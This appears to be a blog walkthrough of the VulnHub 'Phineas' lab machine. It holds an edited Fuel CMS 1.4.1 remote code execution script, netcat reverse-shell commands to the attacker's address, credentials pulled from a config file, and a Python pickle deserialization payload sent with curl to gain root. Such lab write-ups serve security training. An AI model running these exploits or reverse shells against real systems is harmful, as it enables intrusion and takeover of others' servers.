---
layout: post
title:  "VulnHub - Phineas"
date:   2021-04-14 4:23:23 +0300
categories: [vulnhub,walkthrough]
pin: false
tags: [pickle,deserialization,port forwarding,enumeration,CVE]
---

## Walkthrough

## Port Scan

```sh
┌──(alienum㉿kali)-[~]
└─$ sudo nmap 10.0.2.227 -sS -A -O -p-
[sudo] password for alienum: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-14 00:45 EEST
Nmap scan report for 10.0.2.227 (10.0.2.227)
Host is up (0.00093s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:d8:0a:a8:6a:1f:78:6d:ac:06:8f:65:3e:ff:9c:8b (RSA)
|   256 e7:f8:b0:07:1c:5b:4a:48:10:bc:f6:36:42:62:6c:e0 (ECDSA)
|_  256 c8:f0:ea:b8:bf:6b:a5:12:1f:9a:91:62:9d:1a:ce:75 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3306/tcp open  mysql   MariaDB (unauthorized)
```

## Directory Scan
```sh
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.227/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt  -x .txt,.bak,.html,.zip,.php,.php.bak
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.227/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,bak,html,zip,php,php.bak
[+] Timeout:                 10s
===============================================================
2021/04/14 00:50:40 Starting gobuster in directory enumeration mode
===============================================================
/structure            (Status: 301) [Size: 236] [--> http://10.0.2.227/structure/]
```

- /structure

![image]( /assets/img/phineas/1.PNG)

```sh
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.227/structure -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt  -x .txt,.bak,.html,.zip,.php,.php.bak
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.227/structure
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php.bak,txt,bak,html,zip,php
[+] Timeout:                 10s
===============================================================
2021/04/14 00:52:40 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 243] [--> http://10.0.2.227/structure/assets/]
/index.php            (Status: 200) [Size: 9288]                                         
/robots.txt           (Status: 200) [Size: 30]                                           
/fuel                 (Status: 301) [Size: 241] [--> http://10.0.2.227/structure/fuel/] 
```

-  /structure/fuel

```sh
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.227/structure/fuel -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt  -x .txt,.bak,.html,.zip,.php,.php.bak                                                    148 ⨯ 2 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.227/structure/fuel
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,bak,html,zip,php,php.bak
[+] Timeout:                 10s
===============================================================
2021/04/14 00:56:36 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 0] [--> start]
/modules              (Status: 301) [Size: 249] [--> http://10.0.2.227/structure/fuel/modules/]
/scripts              (Status: 301) [Size: 249] [--> http://10.0.2.227/structure/fuel/scripts/]
/install              (Status: 301) [Size: 249] [--> http://10.0.2.227/structure/fuel/install/]
/application          (Status: 301) [Size: 253] [--> http://10.0.2.227/structure/fuel/application/]
/licenses             (Status: 301) [Size: 250] [--> http://10.0.2.227/structure/fuel/licenses/]
/data_backup          (Status: 301) [Size: 253] [--> http://10.0.2.227/structure/fuel/data_backup/]  
```

## Searchsploit

```sh
┌──(alienum㉿kali)-[~]
└─$ searchsploit fuel                 
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
AMD Fuel Service - 'Fuel.service' Unquote Service Path                             | windows/local/49535.txt
Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple Vulnerabilities                  | hardware/webapps/31180.txt
fuel CMS 1.4.1 - Remote Code Execution (1)                                         | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                         | php/webapps/49487.rb
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                               | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                   | php/webapps/48778.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Copy the Script
```sh
┌──(alienum㉿kali)-[~]
└─$ locate linux/webapps/47138.py
/usr/share/exploitdb/exploits/linux/webapps/47138.py
                                                                                                                     
┌──(alienum㉿kali)-[~]
└─$ cd Desktop              
                                                                                                                     
┌──(alienum㉿kali)-[~/Desktop]
└─$ cp /usr/share/exploitdb/exploits/linux/webapps/47138.py .
```

## Edited Script

```python
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib.parse

url = "http://10.0.2.227/structure/index.php"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
	r = requests.get(burp0_url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print (r.text[0:100])
```

## Run the Script 

```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ python3 47138.py                     
cmd:id
systemuid=48(apache) gid=48(apache) groups=48(apache)
....
```

## Reverse Shell

Note the reverse shell should be `url encoded` 

```
nc%20-e%20%2Fbin%2Fbash%2010.0.2.15%204444
```

- Terminal 1

```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ python3 47138.py 
cmd:nc%20-e%20%2Fbin%2Fbash%2010.0.2.15%204444
```

- Terminal 2

```sh
┌──(alienum㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.227] 53914
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

## Searching for user password

- Note always check `config` files

- Credentials are here : `/var/www/html/structure/fuel/application/config/database.php`

```sh
pwd 
/var/www/html/structure/fuel/application/config
cat database.php
...
$db['default'] = array(
...
	'username' => 'anna',
	'password' => 'H993hfkNNid5kk',
...
);
```

## SSH Login

Credentials `anna` : `H993hfkNNid5kk`

```sh
[anna@phineas Desktop]$ ls
user.txt
[anna@phineas Desktop]$ cat user.txt
c2Vpc2VtcHJlbmVsbWlvY3VvcmVtYW1tYQ
[anna@phineas Desktop]$ alienum
```

![image]( /assets/img/phineas/2.PNG)


## Netstat

- Run `netstat -lntup` to see listening ports

```sh
[anna@phineas ~]$ netstat -lntup
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::111                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:729             0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:42044           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp6       0      0 :::111                  :::*                                -                   
udp6       0      0 :::729                  :::*                                -                   
udp6       0      0 ::1:323                 :::*                                -                   
[anna@phineas ~]$ 
```

![image]( /assets/img/phineas/3.PNG)

- Our target is `127.0.0.1:5000`

## Port Forwarding

```sh
┌──(alienum㉿kali)-[~]
└─$ ssh -L 5000:localhost:5000 anna@10.0.2.227    
anna@10.0.2.227's password: 
Last login: Tue Apr 13 21:02:57 2021 from 10.0.2.15
[anna@phineas ~]$ 
```

## Pickle

- The port 5000 run the `app.py` 
- The `pickle.loads(data)` is vulnerable to pickle `deserialization` RCE

![image]( /assets/img/phineas/4.PNG)

```sh
[anna@phineas web]$ cat app.py
#!/usr/bin/python3

import pickle
import base64
from flask import Flask, request

app = Flask(__name__)


@app.route("/heaven", methods=["POST"])
def heaven():
    data = base64.urlsafe_b64decode(request.form['awesome'])
    pickle.loads(data)
    return '', 204
[anna@phineas web]$ 
```

## Creating the script

```sh
import pickle
import sys
import base64

COMMAND = "nc -e /bin/bash 10.0.2.15 4444"

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print (base64.b64encode(pickle.dumps(PickleRce())))
```

## Run it

```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ python3 phineas.py
b'gASVOQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB5uYyAtZSAvYmluL2Jhc2ggMTAuMC4yLjE1IDQ0NDSUhZRSlC4='
```

## Exploit

- Use `curl`
- Send `POST` request to `http://127.0.0.1:5000/heaven`
- Parameter is `awesome`

```
curl -X POST -d "awesome=gASVOQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB5uYyAtZSAvYmluL2Jhc2ggMTAuMC4yLjE1IDQ0NDSUhZRSlC4=" http://127.0.0.1:5000/heaven
```

## In Action

- Terminal 1

```sh
┌──(alienum㉿kali)-[~]
└─$ curl -X POST -d "awesome=gASVOQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB5uYyAtZSAvYmluL2Jhc2ggMTAuMC4yLjE1IDQ0NDSUhZRSlC4=" http://127.0.0.1:5000/heaven
```

- Terminal 2

```sh
┌──(alienum㉿kali)-[~]
└─$ nc -lvp 4444                                                                                                 1 ⚙
listening on [any] 4444 ...
connect to [10.0.2.15] from 10.0.2.227 [10.0.2.227] 53950
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
/usr/bin/script -qc /bin/bash /dev/null
[root@phineas web]# pwd
/home/anna/web
[root@phineas web]# cd /root
[root@phineas root]# ls
anaconda-ks.cfg  initial-setup-ks.cfg  root.txt  run_flask.sh
[root@phineas root]# cat root.txt
YW5uYW1hcmlhbmljb3NhbnRpdml2ZSE
[root@phineas root]# alienum
```

![image]( /assets/img/phineas/5.PNG)
